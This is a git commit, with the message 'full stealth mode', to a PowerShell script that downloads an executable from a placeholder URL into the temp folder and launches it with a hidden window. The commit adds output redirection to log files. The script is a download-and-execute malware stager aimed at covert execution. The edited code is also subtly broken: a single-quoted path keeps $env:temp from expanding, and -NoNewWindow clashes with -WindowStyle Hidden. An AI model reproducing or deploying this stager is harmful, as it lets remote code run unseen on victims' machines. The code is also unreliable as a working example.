35b066f0116845e363cc3e3c9329e9fa42de1f68
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2023-01-30 00:01:01 +0530

    full stealth mode

--- powershell.ps1
+++ powershell.ps1
@@ -1,6 +1,6 @@
-$url = "https://example.com/file.exe"
-$output = "$env:temp\file.exe"
+$url = 'https://example.com/file.exe'
+$output = '$env:temp\file.exe'
 
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $output)
-Start-Process -FilePath $output -WindowStyle Hidden
+Start-Process -FilePath $output -WindowStyle Hidden -NoNewWindow -RedirectStandardOutput "$env:temp\stdout.log" -RedirectStandardError "$env:temp\stderr.log" -RedirectStandardInput "$env:temp\stdin.log"
